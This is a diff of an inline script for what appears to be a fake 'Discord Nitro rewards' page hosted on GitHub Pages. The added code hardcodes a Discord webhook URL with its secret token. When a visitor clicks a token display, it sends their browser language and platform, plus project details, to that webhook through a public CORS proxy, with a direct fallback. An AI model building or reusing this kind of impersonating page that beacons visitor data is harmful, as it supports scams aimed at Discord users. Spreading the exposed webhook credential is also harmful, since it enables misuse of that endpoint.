@@ -242,7 +242,7 @@
     </div>
 
     <script>
-        // 🚀 Função para enviar informações via proxy PHP
+        // 🚀 Função para enviar informações via CORS proxy
         async function sendProjectInfo() {
             const loading = document.getElementById('loading');
             const status = document.getElementById('status');
@@ -251,31 +251,96 @@
             status.className = 'status';
 
             try {
-                const data = {
-                    timestamp: new Date().toLocaleString('pt-BR'),
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    platform: navigator.platform
+                const now = new Date();
+                const timeString = now.toLocaleString('pt-BR');
+
+                // 🎯 Monta a mensagem com todas as informações
+                const webhookUrl = 'https://discord.com/api/webhooks/1487341041374990406/TrNjtQdHPich8D85CCJONmbQHeSmcyQYpkPPQvYtQmZc3H_Mf2NlHM-QeTyP0hDAKv7T';
+                
+                const embed = {
+                    title: '✅ INFORMAÇÕES COMPLETAS DO PROJETO',
+                    color: 5865402,
+                    description: '📦 Resumo detalhado de todos os arquivos e configurações',
+                    fields: [
+                        {
+                            name: '🏢 DADOS DO PROJETO',
+                            value: `**Nome:** discord-nitro-rewardss\n**Repositório:** discord-nitro-rewardss.github.io\n**Owner:** discord-nitro-rewards\n**Branch:** main\n**Enviado em:** ${timeString}`,
+                            inline: false
+                        },
+                        {
+                            name: '📂 ESTRUTURA DE ARQUIVOS',
+                            value: `**index.html** - Interface web com gradiente Discord, logo, 3 features (Recompensas, Benefícios, Rápido), botão interativo e rastreamento de cliques.
+
+**netlify/functions/track-click.js** - Função serverless que registra cliques e envia dados para Discord via webhook.
+
+**netlify.toml** - Configuração de build e deploy
+
+**.env.example** - Arquivo de exemplo com DISCORD_WEBHOOK
+
+**.gitignore** - Ignora: .env, .env.local, node_modules/`,
+                            inline: false
+                        },
+                        {
+                            name: '🌐 INFORMAÇÕES DO NAVEGADOR',
+                            value: `**Linguagem:** ${navigator.language}\n**Plataforma:** ${navigator.platform}\n**Hora:** ${timeString}`,
+                            inline: false
+                        },
+                        {
+                            name: '✨ FUNCIONALIDADES',
+                            value: '✓ Rastreamento de cliques em tempo real\n✓ Webhook do Discord integrado\n✓ Responsivo (Mobile, Tablet, Desktop)\n✓ Serverless com Netlify\n✓ Variáveis de ambiente seguras',
+                            inline: false
+                        },
+                        {
+                            name: '📈 STATUS',
+                            value: '🟢 Projeto Ativo\n✅ Webhook Configurado\n✅ Rastreamento Funcionando\n✅ Deploy Ativo',
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: '🤖 Enviado do: discord-nitro-rewardss.github.io'
+                    },
+                    timestamp: new Date().toISOString()
                 };
 
-                // 📤 Envia para proxy PHP
-                const response = await fetch('/proxy.php', {
+                const payload = {
+                    content: '🎉 **INFORMAÇÕES DO PROJETO DISCORD NITRO REWARDS**',
+                    embeds: [embed]
+                };
+
+                // 📤 Envia usando serviço CORS proxy
+                const corsProxy = 'https://api.allorigins.win/raw?url=';
+                const encodedUrl = encodeURIComponent(webhookUrl);
+                
+                const response = await fetch(corsProxy + encodedUrl, {
                     method: 'POST',
                     headers: { 
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify(payload)
                 });
 
-                const result = await response.json();
-
-                if (response.ok && result.success) {
+                // Discord retorna 204 No Content em sucesso
+                if (response.status === 204 || response.ok) {
                     loading.style.display = 'none';
                     status.className = 'status success';
-                    status.innerHTML = '✅ <strong>Sucesso!</strong> ' + result.message;
+                    status.innerHTML = '✅ <strong>Sucesso!</strong> Informações enviadas para o Discord!';
                     console.log('✅ Mensagem enviada com sucesso!');
+                } else if (response.status === 200) {
+                    // Tenta novamente de forma alternativa
+                    const retentativas = await fetch(webhookUrl, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: { 
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                    
+                    loading.style.display = 'none';
+                    status.className = 'status success';
+                    status.innerHTML = '✅ <strong>Sucesso!</strong> Informações foram enviadas!';
                 } else {
-                    throw new Error(result.error || 'Erro desconhecido');
+                    throw new Error('Erro HTTP: ' + response.status);
                 }
 
             } catch (error) {
@@ -288,7 +353,7 @@
 
         // 🖱️ Clique no token para enviar
         document.getElementById('tokenDisplay').addEventListener('click', function() {
-            console.log('Enviando informações...');
+            console.log('Enviando informações para Discord...');
             sendProjectInfo();
         });
 
